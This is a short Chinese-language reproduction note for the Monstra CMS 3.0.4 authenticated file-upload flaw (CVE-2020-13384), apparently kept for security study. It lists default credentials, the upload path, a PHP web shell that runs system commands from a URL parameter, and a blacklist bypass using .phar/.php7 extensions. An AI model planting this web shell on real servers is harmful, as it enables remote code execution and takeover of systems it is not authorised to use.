## 1. 漏洞介绍

Monstra CMS是乌克兰Sergey Romanenko软件开发者的一套基于PHP的轻量级内容管理系统（CMS）。 

Monstra CMS 3.0.4版本中的index.php脚本存在安全漏洞，该漏洞源于程序没有正确验证文件扩展名。远程攻击者可借助特制HTTP请求利用该漏洞上载和执行任意PHP代码。

[Monstra CMS 3.0.4 - Authenticated Arbitrary File Upload - PHP webapps Exploit](https://www.exploit-db.com/exploits/48479)

**推荐学习：**[Monstra CMS RCE漏洞分析（CVE-2020-13384） - 先知社区](https://xz.aliyun.com/t/7850)

## 2. 漏洞复现

登录：admin/123456

上传地址：……/admin/index.php?id=filesmanager

```PHP
<?php 
echo "webshell works!";
system($_GET['cmd']);
?>
```

有漏洞分析知后端采用的是黑名单过滤，可用phar/php7绕过，示例

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312291821859.png)

注，直接上传时会被重定向至本地局域网地址，可以用burp suite抓包改回去！